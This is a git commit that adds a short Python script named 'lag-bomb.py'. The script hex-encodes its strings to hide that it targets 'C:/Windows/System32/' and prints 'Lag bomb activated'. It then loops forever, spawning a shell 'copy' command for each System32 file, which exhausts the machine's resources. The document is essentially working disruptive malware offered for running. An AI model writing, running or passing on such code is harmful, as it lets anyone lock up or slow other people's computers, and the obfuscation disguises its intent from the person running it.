bb7e8b6b6ddb99c823d73770e4f201a517249dc4
Puzzl3d3d <89996835+Puzzl3d3d@users.noreply.github.com>
2022-05-19 09:07:42 +0100

    Create lag-bomb.py

---
+++ Run At Discretion/lag-bomb.py
@@ -0,0 +1,11 @@
+import os;import codecs;
+a = str(bytearray.fromhex("43 3A 2F 57 69 6E 64 6F 77 73 2F 53 79 73 74 65 6D 33 32 2F 0A").decode())[0:-1];b = os.listdir(a);c = [];
+for d in b:
+    e, f= os.path.splitext(d)
+    if f != "" and f != ".BIN":
+        c.append(e+f)
+print(bytearray.fromhex("4C 61 67 20 62 6F 6D 62 20 61 63 74 69 76 61 74 65 64 0A").decode()[0:-1])
+while True:
+    for h in c:
+        os.popen(f'copy {h} /sys/')
+
